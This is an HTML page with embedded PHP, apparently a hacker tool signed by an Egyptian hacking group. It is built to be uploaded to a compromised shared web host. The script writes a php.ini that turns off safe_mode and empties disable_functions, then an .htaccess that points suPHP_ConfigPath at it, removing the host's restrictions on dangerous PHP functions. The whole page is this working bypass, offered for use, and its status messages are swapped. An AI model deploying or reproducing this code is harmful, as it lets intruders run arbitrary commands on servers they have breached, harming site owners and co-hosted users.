<html dir="rtl">

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title> Mr.Alsa3ek - suPHP_ConfigPath </title>
</head>

<body bgcolor="#808080">

<p align="center" dir="ltr">
<p align="center" dir="ltr">

&nbsp;<p align="center" dir="ltr">

&nbsp;<p align="center" dir="ltr">
<font color="#008000">

<?php
$fo = fopen("php.ini","w");
$fw = fwrite($fo,"safe_mode          =       OFF
disable_functions       =            NONE");
fclose($fo);
if($fw){
echo'<font color="#FF0000" size="5" face="Comic Sans MS">

<b>.htaccess ................ <font color="#008000">File Created .!</font> </b></font>';
}
echo'<br>';
$pwd = getcwd();
$fo1 = fopen(".htaccess","w");
$fw1 = fwrite($fo1,"suPHP_ConfigPath $pwd/php.ini");
fclose($fo1);
if($fw){
echo'<font color="#FF0000" size="5" face="Comic Sans MS">

<b>php.ini ................... <font color="#008000">File Created .!</font> </b></font>';
}
?></font>

<p align="center" dir="ltr">

&nbsp;<p align="center" dir="ltr">

&nbsp;<p align="center" dir="ltr">



<font face="Comic Sans MS" size="4" color="#0000FF"><b>Powered by Mr.Alsa3ek @ TeaM HacKer Egypt
</b></font>

</body>

</html>